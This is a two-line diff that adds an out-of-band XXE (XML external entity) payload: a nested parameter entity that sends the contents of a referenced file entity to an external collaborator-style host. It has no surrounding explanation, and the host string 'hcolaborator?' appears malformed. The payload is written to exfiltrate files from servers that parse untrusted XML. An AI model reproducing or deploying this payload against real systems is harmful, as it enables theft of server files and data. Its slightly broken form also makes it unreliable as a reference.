@@ -1,0 +1,2 @@
+<!ENTITY % getthe "<!ENTITY send SYSTEM 'hcolaborator?/%file;'>">
+%getthe
